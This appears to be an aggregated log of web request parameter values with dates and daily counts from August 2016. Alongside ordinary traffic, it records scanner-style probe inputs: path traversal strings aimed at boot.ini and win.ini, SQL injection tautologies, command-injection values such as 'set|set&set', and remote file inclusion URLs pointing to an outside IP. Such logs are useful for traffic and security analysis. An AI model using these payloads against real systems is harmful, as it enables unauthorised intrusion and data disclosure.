"w_p${""PRbgxaxaxdbfeaefeaacggdcjcdfRP""}"	2016-08-26	1
"w_pset""|set&set"""	2016-08-26	1
cap	2016-08-09	7
cap	2016-08-16	3
cap	2016-08-19	6
p	2016-08-05	36
p	2016-08-08	1
p	2016-08-13	5
p	2016-08-16	6
p	2016-08-17	7
p	2016-08-19	13
w_p'	2016-08-26	1
w_p/../../../../../../../../../../../../../../../../../../../../../../boot.ini	2016-08-26	1
w_p/../../../../../../../../../../../../../../../../../../../../../../windows/win.ini	2016-08-26	1
w_p/..??../..??../..??../..??../..??../..??../..??../..??../..??../..??../..??..//boot.ini	2016-08-26	1
w_p/..??../..??../..??../..??../..??../..??../..??../..??../..??../..??../..??..//windows/win.ini	2016-08-26	1
w_p/..\\../..\\../..\\../..\\../..\\../..\\/boot.ini	2016-08-26	1
w_p/..\\../..\\../..\\../..\\../..\\../..\\/windows/win.ini	2016-08-26	1
w_p/./..././..././..././..././..././..././..././..././..././..././...\\boot.ini	2016-08-26	1
w_p/./..././..././..././..././..././..././..././..././..././..././...\\windows\win.ini	2016-08-26	1
w_p15.241.136.204/serverinclude.html?p	2016-08-26	1
w_pPRbgxaxaxhebgihgegieeaceifdfRP	2016-08-26	1
w_p\..\..\\..\..\\..\..\\..\..\\..\..\\..\/boot.ini	2016-08-26	1
w_p\..\..\\..\..\\..\..\\..\..\\..\..\\..\/windows/win.ini	2016-08-26	1
w_p\..\..\\..\..\\..\..\\..\..\\..\..\\..\\boot.ini	2016-08-26	1
w_p\..\..\\..\..\\..\..\\..\..\\..\..\\..\\boot.ini%00	2016-08-26	1
w_p\..\..\\..\..\\..\..\\..\..\\..\..\\..\\windows\win.ini	2016-08-26	1
w_p\..\..\\..\..\\..\..\\..\..\\..\..\\..\\windows\win.ini%00	2016-08-26	1
w_p\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\.../boot.ini	2016-08-26	1
w_p\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...windows//win.ini	2016-08-26	1
w_pc:/boot.ini	2016-08-26	1
w_pc:/boot.ini%00	2016-08-26	1
w_pc:/windows/win.ini	2016-08-26	1
w_pc:\boot.ini	2016-08-26	1
w_pc:\windows\win.ini	2016-08-26	1
w_pc:\windows\win.ini%00	2016-08-26	1
w_pcap	2016-08-04	2
w_pcap	2016-08-05	3
w_pcap	2016-08-09	42
w_pcap	2016-08-17	1
w_pfile:/c:/boot.ini	2016-08-26	1
w_pfile:/c:/boot.ini%00	2016-08-26	1
w_pfile:/c:/windows/win.ini	2016-08-26	1
w_pfile:/c:/windows/win.ini%00	2016-08-26	1
w_pfile:\c:\boot.ini	2016-08-26	1
w_pfile:\c:\windows\win.ini	2016-08-26	1
w_phTtP://15.241.136.204/serverinclude.html?p	2016-08-26	1
w_phttp://15.241.136.204/serverinclude.html?p	2016-08-26	1
w_phttp://does.not.exist.spidynamics.com/?p	2016-08-26	1
w_pp	2016-08-01	88002
w_pp	2016-08-02	86716
w_pp	2016-08-03	82524
w_pp	2016-08-04	76032
w_pp	2016-08-05	65681
w_pp	2016-08-06	49701
w_pp	2016-08-07	48751
w_pp	2016-08-08	71012
w_pp	2016-08-09	71220
w_pp	2016-08-10	69450
w_pp	2016-08-11	77470
w_pp	2016-08-12	72973
w_pp	2016-08-13	48826
w_pp	2016-08-14	48840
w_pp	2016-08-15	67376
w_pp	2016-08-16	71048
w_pp	2016-08-17	73668
w_pp	2016-08-18	68303
w_pp	2016-08-19	65156
w_pp	2016-08-20	56194
w_pp	2016-08-21	47519
w_pp	2016-08-22	65394
w_pp	2016-08-23	76260
w_pp	2016-08-24	74861
w_pp	2016-08-25	68189
w_pp	2016-08-26	65059
w_pp	2016-08-27	48425
w_pp	2016-08-28	49499
w_pp	2016-08-29	65402
w_pp' AND 5=0 OR 's'='0	2016-08-26	1
w_pp' AND 5=0 OR 's'='0	2016-08-29	1
w_pp' AND 5=5 OR 's'='0	2016-08-26	1
w_pp' AND 5=5 OR 's'='0	2016-08-29	1
w_pp' OR	2016-08-26	1
w_pp' OR	2016-08-29	1
w_pp' OR 5=0 OR 's'='0	2016-08-26	1
w_pp' OR 5=0 OR 's'='0	2016-08-29	1
w_pp' OR 5=5 OR 's'='0	2016-08-26	1
w_pp' OR 5=5 OR 's'='0	2016-08-29	1
w_ppsPiDoMXOYDK	2016-08-26	1
w_psPiDoMVDFPX	2016-08-26	1
w_pset%00	2016-08-26	1
w_pset&set|	2016-08-26	1
w_pset'|set&set'	2016-08-26	1
w_pset`set`	2016-08-26	1
w_pset|set&set	2016-08-26	1
